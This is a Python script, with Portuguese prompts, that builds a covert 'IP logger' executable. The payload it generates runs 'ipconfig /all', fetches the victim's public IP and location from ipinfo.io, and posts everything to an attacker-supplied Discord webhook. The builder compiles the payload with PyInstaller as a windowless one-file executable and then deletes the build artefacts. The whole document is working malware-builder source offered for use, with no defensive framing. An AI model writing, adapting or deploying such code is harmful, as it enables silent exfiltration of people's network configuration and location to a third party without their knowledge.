import os
import sys
import time
import subprocess
import shutil

def build_iplogger():
    print("="*50)
    print("IP LOGGER BUILDER")
    print("="*50)
    
    webhook = input("Digite o Webhook do Discord: ").strip()
    
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print("Webhook inválido!")
        return
    
    image_url = "https://media.discordapp.net/attachments/1373003383321133209/1373703388847669389/images.jpg"
    
    ip_script = f'''
import subprocess
import requests
import time

WEBHOOK_URL = "{webhook}"

def get_ipconfig():
    try:
        return subprocess.check_output("ipconfig /all", shell=True, text=True, timeout=10)
    except Exception as e:
        return f"Erro ao executar ipconfig: {{e}}"

def get_ipinfo():
    try:
        res = requests.get("https://ipinfo.io/json", timeout=5)
        if res.status_code == 200:
            data = res.json()
            return "\\n".join([f"{{k}}: {{v}}" for k, v in data.items() if not k.startswith('readme')])
        else:
            return f"Erro ao obter informações IP: código {{res.status_code}}"
    except Exception as e:
        return f"Erro ao obter informações: {{e}}"

def send_embed(content):
    content = content[:1900] if len(content) > 1900 else content
    embed = {{
        "title": "IP Logger Info",
        "description": "```\\n" + content + "\\n```",
        "color": 0x0000FF,
        "image": {{"url": "{image_url}"}},
        "footer": {{"text": "Enviado em " + time.strftime("%Y-%m-%d %H:%M:%S")}}
    }}
    try:
        requests.post(WEBHOOK_URL, json={{"embeds": [embed]}}, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    ipconfig_data = get_ipconfig()
    ipinfo_data = get_ipinfo()
    combined = ipconfig_data + "\\n\\n[+] Informações IP do ipinfo.io:\\n" + ipinfo_data
    send_embed(combined)
'''

    script_path = "iplogger.py"
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(ip_script)
    
    print("Compilando...")
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_path], check=True)
        
        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
        final_path = os.path.join(downloads, "iplogger.exe")
        
        if os.path.exists(os.path.join("dist", "iplogger.exe")):
            shutil.move(os.path.join("dist", "iplogger.exe"), final_path)
            print(f"IP Logger criado: {final_path}")
    except Exception as e:
        print(f"Erro: {e}")
    
    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        shutil.rmtree(folder, ignore_errors=True)
    for file in ["iplogger.py", "iplogger.spec"]:
        os.remove(file)

if __name__ == "__main__":
    build_iplogger()